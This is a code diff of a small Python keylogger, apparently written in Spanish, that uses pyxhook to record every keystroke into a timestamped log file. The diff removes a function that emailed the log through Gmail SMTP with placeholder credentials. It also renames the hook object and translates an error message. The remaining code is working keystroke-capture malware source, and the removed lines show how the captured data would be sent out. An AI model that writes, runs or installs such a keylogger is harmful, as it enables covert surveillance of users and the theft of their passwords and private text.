@@ -1,22 +1,5 @@
-import pyxhook, smtplib, os
+import pyxhook, os
 from datetime import datetime
-
-
-def send_email(archivo):
-    try:
-        fromaddr = "correoorigen@correo.com"
-        toaddr = "correodest@correo.com"
-        email_username = "usuariologin"
-        email_password = "contraseñalogin"
-        #Datos para enviar el correo
-        server = smtplib.SMTP('smtp.gmail.com:587')
-        server.starttls()
-        server.login(email_username,email_password)
-        server.sendmail(fromaddr, toaddr, archivo)
-        server.quit()
-      
-    except:
-        pass
 
 def main():
     archivo_log = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
@@ -29,17 +12,17 @@ def main():
                 x.write(f"{chr(event.Ascii)}")
 
     
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = PresionarTecla
-    new_hook.HookKeyboard()
+    key_logger = pyxhook.HookManager()
+    key_logger.KeyDown = PresionarTecla
+    key_logger.HookKeyboard()
 
     try:
-        new_hook.start()
+        key_logger.start()
     except KeyboardInterrupt:
-        new_hook.cancel()
+        key_logger.cancel()
         pass
     except Exception as problema:
-        txt = f"Error while catching events:\n {problema}"
+        txt = f"No se pudo registrar el caracter:\n {problema}"
         with open(archivo_log, "a") as x:
             x.write(f"\n{txt}")
 
